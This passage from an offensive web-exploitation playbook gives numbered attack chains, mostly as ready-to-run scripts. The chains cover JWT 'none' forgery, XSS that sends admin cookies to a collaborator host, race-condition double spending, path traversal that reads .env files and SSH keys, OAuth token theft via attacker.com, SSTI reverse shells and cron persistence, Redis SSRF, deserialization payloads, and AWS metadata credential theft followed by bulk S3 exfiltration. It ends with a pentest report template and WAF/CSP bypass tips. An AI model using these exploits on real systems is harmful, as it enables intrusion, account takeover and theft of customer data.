**CVSS:** 9.8 | **Auth:** Low-priv (or none if JWT obtained from registration) | **Reliability:** 90%

```python
# jwt_none_chain.py
import base64, json, requests

TARGET = "https://target.com"

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt_none(original_jwt, new_payload_overrides=None, alg_variant="none"):
    parts = original_jwt.split('.')
    payload = json.loads(base64.b64decode(parts[1] + '=='))
    if new_payload_overrides:
        payload.update(new_payload_overrides)
    header = {"alg": alg_variant, "typ": "JWT"}
    enc_h = b64url_encode(json.dumps(header, separators=(',', ':')))
    enc_p = b64url_encode(json.dumps(payload, separators=(',', ':')))
    return f"{enc_h}.{enc_p}."

# Get a valid JWT (register/login)
r = requests.post(f"{TARGET}/api/register", json={
    "email": "attacker@evil.com", "password": "Passw0rd!"
})
valid_jwt = r.json().get("token", "")
print(f"Valid JWT: {valid_jwt[:40]}...")

# Forge with none algorithm — various capitalizations
for alg in ["none", "None", "NONE", "nOnE"]:
    forged = forge_jwt_none(valid_jwt, {"role": "admin", "isAdmin": True}, alg_variant=alg)
    resp = requests.get(f"{TARGET}/api/admin/users",
                        headers={"Authorization": f"Bearer {forged}"})
    print(f"alg={alg}: HTTP {resp.status_code}")
    if resp.status_code == 200:
        print(f"[VULN] Admin access with alg={alg}!")
        print(resp.text[:500])
        # Step 2: Explore admin endpoints
        for endpoint in ["/api/admin/users", "/api/admin/config", "/api/admin/exec",
                         "/api/admin/upload", "/api/admin/run"]:
            r2 = requests.get(f"{TARGET}{endpoint}",
                              headers={"Authorization": f"Bearer {forged}"})
            print(f"  {endpoint}: {r2.status_code}")
        break
```

---

## CHAIN 14 — LOG INJECTION → LOG VIEWER XSS → ADMIN SESSION THEFT

```
Log injection via User-Agent / X-Forwarded-For / input field
     |
     | inject XSS payload into application logs
     v
Admin views logs in web UI (log viewer panel)
     |
     | XSS executes in admin browser context
     v
Admin cookie/token stolen → admin takeover
```

**CVSS:** 8.0 | **Auth:** None | **Reliability:** 60%

```bash
TARGET_URL="https://target.com"
COLLAB="YOUR.collaborator.net"
LOG_VIEWER="https://target.com/admin/logs"

XSS='<script>document.location="https://COLLAB/?c="+document.cookie</script>'
XSS=$(echo "$XSS" | sed "s/COLLAB/$COLLAB/g")

# Step 1: Inject into User-Agent (logged by most web servers)
curl -s "$TARGET_URL/login" -A "$XSS" > /dev/null
echo "XSS injected via User-Agent"

# Inject into X-Forwarded-For (logged by apps that trust this header)
curl -s "$TARGET_URL/api/search?q=test" \
  -H "X-Forwarded-For: 1.2.3.4, $XSS" > /dev/null
echo "XSS injected via X-Forwarded-For"

# Inject into other logged fields
curl -s -X POST "$TARGET_URL/api/contact" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$XSS\",\"message\":\"test\",\"email\":\"test@test.com\"}" > /dev/null
echo "XSS injected via form field"

# Step 2: Force admin to visit log viewer (social engineering or CSRF)
# If log viewer auto-refreshes, just wait for admin to check logs

# Step 3: Use stolen session (same as Chain 3 Step 3-4)
```

---

## CHAIN 15 — RACE CONDITION → NEGATIVE BALANCE / DOUBLE SPEND

```
Race condition in transaction processing
     |
     | parallel requests bypass balance check
     v
Negative balance or double redemption
     |
     | extract value beyond what account holds
```

**CVSS:** 7.5 | **Auth:** Low-priv | **Reliability:** 65%

```python
# race_double_spend.py
import threading, requests, time

TARGET = "https://target.com"
SESSION_COOKIE = "session=VALID_SESSION_COOKIE"
HEADERS = {"Cookie": SESSION_COOKIE, "Content-Type": "application/json"}

# Check balance before
r = requests.get(f"{TARGET}/api/account/balance", headers=HEADERS)
print(f"Balance before: {r.json()}")

# Race: simultaneously transfer all funds + one extra
PAYLOAD = {"to_account": "attacker_account", "amount": 100}
barrier = threading.Barrier(30)
results = []

def send():
    barrier.wait()
    r = requests.post(f"{TARGET}/api/transfer", json=PAYLOAD, headers=HEADERS)
    results.append((r.status_code, r.text[:100]))

threads = [threading.Thread(target=send) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()

successes = [r for r in results if r[0] == 200]
print(f"Successful transfers: {len(successes)}/30")
r = requests.get(f"{TARGET}/api/account/balance", headers=HEADERS)
print(f"Balance after: {r.json()}")
```

---

## CHAIN 16 — MASS ASSIGNMENT → ROLE ESCALATION → ADMIN RCE

```
Mass assignment vulnerability on profile update
     |
     | inject role=admin into PUT /api/user/me
     v
Own account now has admin role
     |
     | access admin-only endpoints
     v
Admin exec / file upload / SSRF → RCE
```

**CVSS:** 9.0 | **Auth:** Low-priv | **Reliability:** 75%

```bash
TARGET_URL="https://target.com"
TOKEN="LOW_PRIV_TOKEN"

# Step 1: Mass assignment on profile
curl -s -X PUT "$TARGET_URL/api/user/me" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"attacker","role":"admin","isAdmin":true,"is_staff":true,"permissions":["*"]}' | tee mass_assign.txt

# Verify role change
NEW_TOKEN=$(curl -s -X POST "$TARGET_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Passw0rd!"}' | jq -r '.token')
echo "New token: $NEW_TOKEN"
curl -s -H "Authorization: Bearer $NEW_TOKEN" "$TARGET_URL/api/user/me" | jq .role | tee role_check.txt

# Step 2: Admin RCE
for admin_ep in "/api/admin/exec" "/api/admin/run" "/api/admin/command" "/admin/terminal" "/api/debug/eval"; do
  STATUS=$(curl -sI -H "Authorization: Bearer $NEW_TOKEN" "${TARGET_URL}${admin_ep}" -o /dev/null -w "%{http_code}")
  [ "$STATUS" != "404" ] && echo "$STATUS $admin_ep" | tee -a admin_rce_endpoints.txt
done

curl -s -X POST "$TARGET_URL/api/admin/exec" \
  -H "Authorization: Bearer $NEW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}' | tee admin_rce.txt
```

---

## CHAIN 17 — PATH TRAVERSAL → CONFIG FILE READ → CREDENTIALS → RCE

```
Path traversal in file download / include
     |
     | read application config files, .env, wp-config.php
     v
Database credentials, API keys, SSH keys extracted
     |
     | connect to database directly, or SSH with found key
     v
RCE / data exfiltration
```

**CVSS:** 9.8 | **Auth:** None | **Reliability:** 70%

```bash
TARGET_URL="https://target.com"

# Step 1: Confirm path traversal
for traversal in \
  "../../../../etc/passwd" \
  "..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
  "....//....//....//etc/passwd" \
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
  "..%252f..%252f..%252fetc%252fpasswd" \
  "..%c0%af..%c0%af..%c0%afetc/passwd"; do
  RESP=$(curl -s "${TARGET_URL}/api/download?file=$traversal")
  echo "$RESP" | grep -q "root:" && echo "[TRAVERSAL] $traversal" | tee traversal_confirm.txt
done

# Step 2: Read sensitive files
for config in \
  "../../../../.env" \
  "../../../../var/www/html/.env" \
  "../../../../var/www/html/wp-config.php" \
  "../../../../var/www/html/config/database.php" \
  "../../../../home/%s/.ssh/id_rsa" \
  "../../../../root/.ssh/id_rsa" \
  "../../../../var/www/html/config.php" \
  "../../../../etc/mysql/my.cnf" \
  "../../../../var/www/html/app/config/parameters.yml"; do
  RESP=$(curl -s "${TARGET_URL}/api/download?file=$config")
  [ -n "$RESP" ] && echo "=== $config ===" | tee -a traversal_loot.txt && echo "$RESP" | tee -a traversal_loot.txt
done

# Step 3: Extract credentials and connect
DB_PASS=$(grep -oP "DB_PASSWORD=\K[^\n]+" traversal_loot.txt | head -1)
DB_HOST=$(grep -oP "DB_HOST=\K[^\n]+" traversal_loot.txt | head -1)
DB_USER=$(grep -oP "DB_USERNAME=\K[^\n]+" traversal_loot.txt | head -1)
DB_NAME=$(grep -oP "DB_DATABASE=\K[^\n]+" traversal_loot.txt | head -1)

echo "DB: $DB_USER:$DB_PASS@$DB_HOST/$DB_NAME"

# Connect to database
mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
  -e "SELECT user,password FROM users LIMIT 10;" 2>/dev/null | tee db_users.txt

# SSH with found key
SSH_KEY=$(grep -oP "-----BEGIN.*?-----END.*?-----" traversal_loot.txt -s)
echo "$SSH_KEY" > /tmp/id_rsa && chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no www-data@"$TARGET_IP" "id; hostname" | tee ssh_rce.txt
```

---

## CHAIN 18 — OAUTH MISCONFIGURATION → ACCOUNT TAKEOVER

```
OAuth provider accepts unvalidated redirect_uri
     |
     | attacker crafts authorization URL with redirect_uri=attacker.com
     v
Authorization code or access token delivered to attacker
     |
     | exchange code for tokens (if client secret known or implicit flow)
     v
Full account takeover
```

**CVSS:** 9.3 | **Auth:** None | **Reliability:** 80%

```bash
TARGET_URL="https://target.com"
AUTHZ_URL="https://auth.target.com/oauth/authorize"
TOKEN_URL="https://auth.target.com/oauth/token"
CLIENT_ID=$(grep -r "client_id\|clientId" $WORKSPACE/recon/js/ 2>/dev/null | grep -oP "'[a-z0-9_-]{8,}'" | head -1 | tr -d "'")
CLIENT_SECRET=$(grep -r "client_secret\|clientSecret" $WORKSPACE/recon/js/ 2>/dev/null | grep -oP "'[a-z0-9_-]{20,}'" | head -1 | tr -d "'")

# Build malicious authorization URL
EVIL_REDIRECT="https://attacker.com/callback"
MALICIOUS_AUTH="${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${EVIL_REDIRECT}&scope=openid email profile&state=csrf123"
echo "Malicious URL: $MALICIOUS_AUTH" | tee oauth_chain.txt

# If implicit flow:
IMPLICIT_AUTH="${AUTHZ_URL}?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${EVIL_REDIRECT}&scope=openid&state=csrf123"
echo "Implicit: $IMPLICIT_AUTH" >> oauth_chain.txt

# Exchange code once captured (attacker.com receives: GET /callback?code=AUTHCODE&state=csrf123)
AUTHCODE="CODE_FROM_ATTACKER_SERVER"
curl -s -X POST $TOKEN_URL \
  -d "grant_type=authorization_code&code=$AUTHCODE&redirect_uri=$EVIL_REDIRECT&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET" \
  | jq . | tee oauth_token_exchange.txt

ACCESS_TOKEN=$(cat oauth_token_exchange.txt | jq -r '.access_token')
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$TARGET_URL/api/user/me" | jq . | tee oauth_ato.txt
```

---

## CHAIN 19 — WebSocket HIJACKING → CSRF → STORED XSS

```
WebSocket accepts cross-origin connections (no Origin check)
     |
     | CSRF via WebSocket: attacker sends authenticated WS action
     v
Store XSS payload via WS message (saved to DB)
     |
     | admin views page with stored XSS
     v
Admin session stolen → further compromise
```

**CVSS:** 8.8 | **Auth:** Victim logged in | **Reliability:** 55%

```python
# ws_csrf_xss.py — run from attacker-controlled page
import websocket, json, ssl

TARGET_WS = "wss://target.com/ws"
COLLAB = "YOUR.collaborator.net"
VICTIM_COOKIE = "session=VICTIM_SESSION"

XSS_PAYLOAD = f"<script>document.location='https://{COLLAB}/?c='+document.cookie</script>"

try:
    ws = websocket.create_connection(
        TARGET_WS,
        header={
            "Origin": "https://evil.com",  # Cross-origin test
            "Cookie": VICTIM_COOKIE
        },
        sslopt={"cert_reqs": ssl.CERT_NONE}
    )
    print("[+] Cross-origin WS connection accepted!")

    # Send stored XSS via WebSocket
    ws.send(json.dumps({
        "type": "comment",
        "content": XSS_PAYLOAD,
        "channel": "public"
    }))
    print(f"Response: {ws.recv()}")

    # CSRF action
    ws.send(json.dumps({
        "type": "updateProfile",
        "data": {"bio": XSS_PAYLOAD, "website": "https://evil.com"}
    }))
    print(f"Profile update: {ws.recv()}")
    ws.close()

except Exception as e:
    print(f"Error: {e}")
```

---

## CHAIN 20 — HTTP RESPONSE SPLITTING → CACHE POISONING → REFLECTED XSS

```
HTTP Response Splitting via unvalidated redirect parameter
     |
     | inject CRLF into Location header, add fake response body
     v
Proxy/CDN caches the fake response (which contains XSS)
     |
     | subsequent victims get the cached XSS payload
```

**CVSS:** 7.5 | **Auth:** None | **Reliability:** 45%

```bash
TARGET_URL="https://target.com/redirect"
# Test CRLF injection
CRLF_PAYLOAD="https://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
curl -sI "${TARGET_URL}?url=$CRLF_PAYLOAD" | tee crlf_test.txt
# Check if injected headers appear in response
curl -sI "${TARGET_URL}?url=$CRLF_PAYLOAD" | grep -iE "Content-Length: 0|script|alert" && echo "[CRLF INJECTION!]"
```

---

## CHAIN 21 — SSTI → RCE → PERSISTENCE

```
Server-Side Template Injection in user-controlled field
     |
     | template engine executes OS command
     v
RCE achieved
     |
     | write cron job / SSH key / reverse shell
     v
Persistent access
```

**CVSS:** 9.9 | **Auth:** Varies | **Reliability:** 85%

```bash
TARGET_URL="https://target.com/page"
PARAM="name"
LHOST="ATTACKER_IP"
LPORT="4444"

urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$1"; }

# Jinja2 RCE
JINJA2_RCE='{{cycler.__init__.__globals__.os.popen("bash -c '"'"'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"'"'").read()}}'
JINJA2_RCE="${JINJA2_RCE//LHOST/$LHOST}"
JINJA2_RCE="${JINJA2_RCE//LPORT/$LPORT}"
curl -s "${TARGET_URL}?${PARAM}=$(urlencode "$JINJA2_RCE")"

# Twig RCE
TWIG_RCE='{{["bash -c '"'"'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"'"'"]|map("system")|join}}'
TWIG_RCE="${TWIG_RCE//LHOST/$LHOST}"
TWIG_RCE="${TWIG_RCE//LPORT/$LPORT}"
curl -s "${TARGET_URL}?${PARAM}=$(urlencode "$TWIG_RCE")"

# ERB RCE
ERB_RCE="<%= \`bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\` %>"
curl -s "${TARGET_URL}?${PARAM}=$(urlencode "$ERB_RCE")"

# Persistence after RCE
# Add SSH key
curl -s "${TARGET_URL}?${PARAM}=$(urlencode '{{cycler.__init__.__globals__.os.popen("mkdir -p /root/.ssh && echo ATTACKER_PUBKEY >> /root/.ssh/authorized_keys").read()}}')"
# Cron reverse shell
curl -s "${TARGET_URL}?${PARAM}=$(urlencode '{{cycler.__init__.__globals__.os.popen("echo '"'"'* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"'"' >> /var/spool/cron/www-data").read()}}')"
```

---

## CHAIN 22 — SSRF → INTERNAL SERVICE → REDIS RCE

```
SSRF to internal network
     |
     | reach unauthenticated Redis on 127.0.0.1:6379 via Gopher protocol
     v
Write cron job or SSH key via Redis CONFIG SET
     v
RCE on server
```

**CVSS:** 9.8 | **Auth:** None | **Reliability:** 60%

```bash
TARGET_URL="https://target.com/api/fetch"
REDIS_HOST="127.0.0.1"
REDIS_PORT="6379"
LHOST="ATTACKER_IP"
LPORT="4444"

# Gopher payload to write SSH key
ATTACKER_PUBKEY="ssh-rsa AAAA... attacker@evil"

# Redis commands via gopher://
python3 << 'PYEOF'
import urllib.parse

host = "127.0.0.1"
port = 6379
attacker_pub = "ssh-rsa AAAA... attacker"

cmds = [
    "*1\r\n$8\r\nflushall\r\n",
    f"*3\r\n$3\r\nset\r\n$1\r\n1\r\n${len(attacker_pub)+4}\r\n\n\n{attacker_pub}\n\n\r\n",
    f"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$11\r\n/root/.ssh/\r\n",
    f"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$15\r\nauthorized_keys\r\n",
    "*1\r\n$4\r\nsave\r\n"
]

payload = "".join(cmds)
encoded = urllib.parse.quote(payload, safe="")
gopher_url = f"gopher://{host}:{port}/_{encoded}"
print(gopher_url)
PYEOF

GOPHER_URL=$(python3 -c "
import urllib.parse
host='127.0.0.1'; port=6379
key='ssh-rsa AAAA... attacker'
cmds='*1\r\n\$8\r\nflushall\r\n*3\r\n\$3\r\nset\r\n\$1\r\n1\r\n\$'+str(len(key)+4)+'\r\n\n\n'+key+'\n\n\r\n*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$3\r\ndir\r\n\$11\r\n/root/.ssh/\r\n*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$10\r\ndbfilename\r\n\$15\r\nauthorized_keys\r\n*1\r\n\$4\r\nsave\r\n'
print('gopher://'+host+':'+str(port)+'/_'+urllib.parse.quote(cmds,safe=''))
")

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"$GOPHER_URL\"}" | tee redis_ssrf.txt

# SSH in after Redis writes key
ssh -i ~/.ssh/id_rsa root@$TARGET_IP "id" | tee redis_rce.txt
```

---

## CHAIN 23 — INSECURE DESERIALIZATION → RCE

```
Unserialize() / pickle.loads() / ObjectInputStream with user data
     |
     | craft malicious serialized object with gadget chain
     v
RCE on deserialization
```

**CVSS:** 9.8 | **Auth:** Varies | **Reliability:** 75%

```bash
# PHP deserialization
# Generate payload with phpggc
phpggc Laravel/RCE1 system id -b | tee php_deserial_payload.txt
phpggc Symfony/RCE4 system id -b | tee -a php_deserial_payload.txt

# Send in cookie or parameter
PAYLOAD=$(cat php_deserial_payload.txt)
curl -s "${TARGET_URL}/page" -H "Cookie: session=$PAYLOAD" | tee php_deserial_resp.txt

# Python pickle RCE
python3 << 'PYEOF'
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Pickle payload (base64): {payload}")
PYEOF

# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0 > java_deserial.txt
curl -s -X POST "${TARGET_URL}/api/import" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @<(base64 -d java_deserial.txt) | tee java_deserial_resp.txt

# .NET deserialization (BinaryFormatter)
# ysoserial.net -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "cmd /c calc"
```

---

## COMPLETE WORKED EXAMPLE — MODERN SAAS APP

**Target:** Fictional SaaS (React + GraphQL + Node.js + AWS)
**Objective:** Full cloud compromise from unauthenticated

```
ATTACK CHAIN:
GraphQL introspection (unauth)
     |
     | discover "generateReport" mutation with url parameter
     v
SSRF via GraphQL mutation (url param sent to server-side HTTP client)
     |
     | fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/
     v
AWS IAM role credentials extracted
     |
     | AWS CLI with stolen STS credentials
     v
S3 ListBuckets → find customer-data-prod bucket
     v
S3 GetObject → download all customer PII and payment data
     v
SecretsManager → get DB password → connect to RDS
     v
FULL CLOUD + DATABASE COMPROMISE
```

```bash
GRAPHQL="https://saas-target.com/graphql"

# Step 1: Introspect without auth
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}' \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
for t in d.get('data',{}).get('__schema',{}).get('types',[]):
    for f in (t.get('fields') or []):
        args = [a['name'] for a in (f.get('args') or [])]
        if any(a in ['url','uri','host','target','src'] for a in args):
            print(f'{t[\"name\"]}.{f[\"name\"]}({args})')
" | tee saas_ssrf_candidates.txt

# Step 2: SSRF via GraphQL
curl -s -X POST $GRAPHQL \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { generateReport(url: \"http://169.254.169.254/latest/meta-data/\") { content } }"}' \
  | jq -r '.data.generateReport.content' | tee saas_meta.txt

ROLE=$(curl -s -X POST $GRAPHQL -H "Content-Type: application/json" \
  -d '{"query":"mutation { generateReport(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\") { content } }"}' \
  | jq -r '.data.generateReport.content' | tr -d ' \n')

CREDS_JSON=$(curl -s -X POST $GRAPHQL -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation { generateReport(url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\\\") { content } }\"}" \
  | jq -r '.data.generateReport.content')
echo "Credentials: $CREDS_JSON" | tee saas_creds.txt

# Step 3: Configure AWS CLI
export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])")

# Step 4: Enumerate and exfiltrate
aws sts get-caller-identity | tee saas_identity.txt
aws s3 ls | tee saas_s3.txt
aws s3 ls s3://customer-data-prod/ | head -20 | tee saas_s3_data.txt
aws s3 cp s3://customer-data-prod/ ./loot/ --recursive --no-progress 2>/dev/null | tee saas_exfil.txt
aws secretsmanager list-secrets | jq -r '.SecretList[].ARN' | while read arn; do
  aws secretsmanager get-secret-value --secret-id "$arn" 2>/dev/null | tee -a saas_secrets.txt
done
```

---

## CHAIN REPORTING FORMAT

```
=== CHAINED VULNERABILITY FINDING ===

Chain Name: [descriptive name]
Severity: Critical / High / Medium
CVSS Score: X.X (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
Auth Required: None / Low-priv / High-priv
Reliability: XX%

CHAIN DIAGRAM:
[Step 1 Vuln] → [gain] → [Step 2 Vuln] → [gain] → [Final Impact]

PREREQUISITES:
- Vuln A: [description, endpoint, parameter]
- Vuln B: [description, endpoint, parameter]
- [conditions: e.g., admin must view logs, victim must be logged in]

STEP-BY-STEP EXPLOITATION:
1. [Detailed step with exact command/request]
2. [Detailed step]
3. [Detailed step]

PROOF OF CONCEPT:
Request 1:
---
[HTTP request]
---
Response 1:
---
[HTTP response]
---

Request 2:
---
[HTTP request]
---

IMPACT:
[What the attacker achieves, data accessed, persistence, etc.]

INDIVIDUAL VULNERABILITIES:
- Finding 1: [title, severity, CVSS, evidence ref]
- Finding 2: [title, severity, CVSS, evidence ref]

REMEDIATION:
- Fix 1: [specific code/config change]
- Fix 2: [specific code/config change]

EVIDENCE:
- File: [path]
- Hash: [sha256]
```

---

## DEFENSE BYPASS TIPS BY CHAIN TYPE

```
SSRF CHAINS:
- Use http://[::ffff:169.254.169.254]/ for IPv6 bypass of IP blocklists
- Use http://169.254.169.254.nip.io/ (resolves to 169.254.169.254)
- Use DNS rebinding if IP is blocked
- Use gopher:// and dict:// for non-HTTP services
- Redirect chain: point to attacker server that 302s to metadata

XSS CHAINS:
- CSP bypass via JSONP on allowed CDN domains
- CSP bypass via angular.js if angular is in whitelist
- DOM clobber + prototype pollution for CSP-bypassed XSS
- use:// in Firefox for protocol bypass
- data: URI if allowed in CSP

SQLI CHAINS:
- Use sqlmap --tamper for WAF bypass
- Out-of-band (DNS) exfil if in-band is blocked
- Time-based blind if output is stripped

JWT CHAINS:
- Try all none capitalization variants
- Use jwt-tool to automate confusion attacks
- Check for embedded JWTs in cookies, Authorization, custom headers

OAUTH CHAINS:
- Multiple redirect_uri encoding variants
- Check if state is actually validated server-side
- Try fragment (#) vs query (?) in redirect
```
